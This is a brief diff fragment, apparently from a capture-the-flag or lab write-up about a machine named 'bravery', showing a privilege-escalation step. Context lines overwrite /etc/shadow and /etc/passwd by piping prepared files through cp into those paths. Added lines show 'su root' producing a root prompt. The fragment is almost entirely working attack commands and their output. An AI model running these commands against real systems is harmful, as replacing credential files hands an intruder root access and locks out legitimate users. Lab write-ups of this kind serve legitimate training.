@@ -46,3 +46,9 @@ echo "$(cat shadow)" | cp /dev/stdin "$LFILE"
 
 LFILE=/etc/passwd
 echo "$(cat passwd)" | cp /dev/stdin "$LFILE"
+
+```
+bash-4.2$ su root          
+su root                     
+[root@bravery shm]#
+```
